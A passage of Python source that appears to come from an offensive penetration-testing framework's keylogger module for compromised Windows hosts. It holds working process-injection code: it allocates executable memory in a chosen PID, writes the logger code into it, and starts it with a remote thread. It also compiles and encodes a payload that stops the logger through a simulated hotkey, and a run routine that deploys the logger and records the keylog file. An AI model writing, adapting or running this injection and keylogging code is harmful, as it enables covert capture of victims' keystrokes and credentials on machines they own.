            HANDLE_TYPE pHandle;
            ADDRESS_TYPE address;
            HANDLE_TYPE hThread;
            HANDLE_TYPE hMtx;
            int rVal;

            pHandle = OpenProcess(0x43a, 0, PID);
            if (pHandle == 0) 
            {
                sendint(0);
                return;
            }

            address = VirtualAllocEx(pHandle, 0, CODESIZE, 0x1000, 0x40);
            if (address == 0) 
            {
                sendint(0);
                return;
            }

            rVal = WriteProcessMemory(pHandle, address, THREADME, CODESIZE, 0);
            if (rVal == 0) 
            {
                sendint(0);
                return;
            }
 
            // before we start the logger, create a mutex TERMLOG that is initially owned
            hMtx = CreateMutex(0, 1, "Global\\TERMLOG");
            // make sure we have ownership, might be a double run where we previously
            // released this mutex and it already exists
            WaitForSingleObject(hMtx, -1);

            hThread = CreateRemoteThread(pHandle, 0, 0, address, 0, 0, 0);
            if (hThread == 0) 
            {
                sendint(0);
                return;
            }

            sendint(1);
        }
        """

        if self.is_win64:
            injectCode = injectCode.replace('IMPORT_TYPE', 'local')
            injectCode = injectCode.replace('ADDRESS_TYPE', 'unsigned long long')
            injectCode = injectCode.replace('HANDLE_TYPE', 'unsigned long long')
        else:
            injectCode = injectCode.replace('IMPORT_TYPE', 'remote')
            injectCode = injectCode.replace('ADDRESS_TYPE', 'unsigned int')
            injectCode = injectCode.replace('HANDLE_TYPE', 'unsigned int')

        return self.node.shell.runCode(injectCode, injectVars)

    # terminates our logger thread by sending a terminating hotkey combo
    def compileTermLogger(self):
        termVars = {}

        # this has to be sent from a PID on the active desktop
        termCode = """
        #import "IMPORT_TYPE", "user32.dll|keybd_event" as "keybd_event"
        #import "IMPORT_TYPE", "kernel32.dll|ExitThread" as "ExitThread"
       
        void main() 
        {   
            // simulate the hotkey VK_RSHIFT + VK_F8
            keybd_event(0xA1, 0x45, 1, 0);
            keybd_event(0x77, 0x45, 1, 0);
            // ups
            keybd_event(0x77, 0x45, 3, 0);
            keybd_event(0xA1, 0x45, 3, 0);
            
            ExitThread(0);
        }
        """
        self.node.shell.clearfunctioncache()

        if self.is_win64:
            termCode = termCode.replace('IMPORT_TYPE', 'local')
        else:
            termCode = termCode.replace('IMPORT_TYPE', 'remote')

        termLogger = self.node.shell.compile(termCode, termVars)
        
        from encoder import chunkedaddencoder
        encoder = chunkedaddencoder.intelchunkedaddencoder()
        encoder.setbadstring("\"\n\x00")
        termLogger = encoder.encode(termLogger)
        
        return termLogger

    def getargs(self):
        """
        Get all the arguments from the commandline or gui
        """
        
        self.pid     = int(self.argsDict.get("pid",  self.pid))
        self.term    = int(self.argsDict.get("term", self.term))
        self.logfile = self.argsDict.get("log", "C:\\log-%s.txt"%time.strftime("%s"))
        
    def run(self):
        self.getargs()
        ret = 0

        for node in self.argsDict["passednodes"]:
            self.node       = node

            if self.node.nodetype not in ["win32Node", "win64Node"]:
                   self.log("The node named %s of type %s is unsupported." % (self.node.get_name(), self.node.nodetype))
                   continue
           
            self.is_win64 = True if self.node.nodetype == 'win64Node' else False
            result = 0
            if self.term: 
                termLogger = self.compileTermLogger()
                if not self.pid:
                    result = self.localThread(termLogger)
                else:
                    result = self.remoteThread(termLogger, self.pid)
                    
                if result == -1:
                    msg = "[!] -"
                else:
                    msg = "[!] +"
                self.log(msg + " tried to terminate logger ...")
                continue

            logger = self.compileHookLogger()
            self.log('Logging to: %s' % self.logfile)

            try:
                if not self.pid:
                    self.log("[!] Defaulting to regular thread mode...")
                    result = self.localThread(logger)
                else:
                    self.log('Injecting into PID: %s' % self.pid)
                    result = self.remoteThread(logger, self.pid)
            except Exception, ex:
                self.log("[!] error on logger init!", ex)
                continue

            if result:
                target = self.node.get_known_host("127.0.0.1")
                target.add_knowledge("keylog", self.logfile, 100)
                self.log("[!] (%s) Logger thread initialized" % self.node.get_name())
                ret = 1
            else:
                self.log("[!] (%s) Logger thread failed" % self.node.get_name())

        return ret

    

